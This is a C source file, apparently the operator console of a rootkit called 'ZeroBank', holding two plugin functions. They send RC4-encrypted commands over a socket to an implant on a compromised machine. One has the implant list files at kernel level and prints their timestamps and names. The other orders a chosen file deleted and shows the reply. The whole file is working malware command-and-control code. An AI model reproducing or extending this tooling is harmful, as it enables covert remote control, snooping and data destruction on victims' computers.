#include "server_globals.h"

BOOLEAN rootkit_get_kernel_fileexplorer(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	INT amount = 0;
	INT offset = 0;
	INT recvsize = 0;
	ULONG getbytes = 0;
	ZEROBANK_PACKET_TYPE type = { 0 };
	PROOTKIT_FILEEXPLORER_ENTRY Entry = NULL, Buffer = NULL;
	PVOID Out = NULL;
	ULONG NumberOfElements = 0;
	BOOL ret = FALSE;

	char *ctime = "CreateTime";
	char *wtime = "WriteTime";
	char *file = "File";

	type.PacketType = PacketType;

	printf("\r\n{ KERNEL-FILE-EXPLORER-PLUGIN }-> ");
	scanf("%s", type.FileName_For_FileExplorer_plugin);

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&type, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0) 
	{
		recvsize = recv(sock, (char*)&getbytes, sizeof(ULONG), 0);
		if (recvsize > 0 && getbytes > 0)
		{
			Out = recv_decrypted(sock, RC4_KEY_2, (PROOTKIT_FILEEXPLORER_ENTRY)Buffer, getbytes);
			if (Out != NULL)
			{
				Entry = (PROOTKIT_FILEEXPLORER_ENTRY)Out;
				if (Entry)
				{
					printf("\r\n");
					printf("\r\n%s %25s %40s", ctime, wtime, file);
					printf("\r\n");

					NumberOfElements = getbytes / sizeof(ROOTKIT_FILEEXPLORER_ENTRY);

					for (ULONG i = 0; i < NumberOfElements; i++, Entry++)
					{
						printf("\r\n%s %25s %40S", Entry->CreateTime, Entry->WriteTime, Entry->FileName);

						ret = TRUE;
					}
				}

				RtlFreeHeap(GetProcessHeap(), 0, Out);
				Out = NULL;

			}
		}
		else
		{
			printf("\r\n[!] Error receiving allocation bytes: %d", RtlGetLastWin32Error());
			ret = FALSE;
		}
	}

	else
	{
		printf("\r\n[!] Error sending packet type: %d", RtlGetLastWin32Error());
		ret = FALSE;
	}

	return ret;
}

BOOLEAN rootkit_delete_file(IN SOCKET Socket, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE type	= { 0 };
	INT sendsize				= 0;
	INT recvsize				= 0;
	char buffer[50]				= { 0 };
	BOOLEAN ret;
	rc4_ctx ctx = { 0 };

	printf("\r\n{ FILE-DELETE-PLUGIN } Introduce file to delete-> ");
	scanf("%s", type.FileName_For_File_Deletion);

	type.PacketType = PacketType;

	sendsize = send_packet_encrypted(Socket, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&type, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		recvsize = recv(Socket, buffer, sizeof(buffer), 0);
		if (recvsize > 0)
		{
			rc4_init(&ctx, key1, sizeof(key1));
			rc4_decrypt(&ctx, (const uint8*)buffer, (uint8*)buffer, recvsize);

			buffer[recvsize] = '\0';
			printf("\r\n{ FILE-DELETE-PLUGIN } %s", buffer);
			ret = TRUE;
		}
		else
		{
#ifdef _DEBUG
			printf("\r\n[!] Error receiving string: %d", RtlGetLastWin32Error());
#endif
			ret = FALSE;
		}
	}
	else
	{
#ifdef _DEBUG
		printf("\r\n[!] Error sending packet type: %d", RtlGetLastWin32Error());
#endif
		ret = FALSE;
	}

	return ret;
}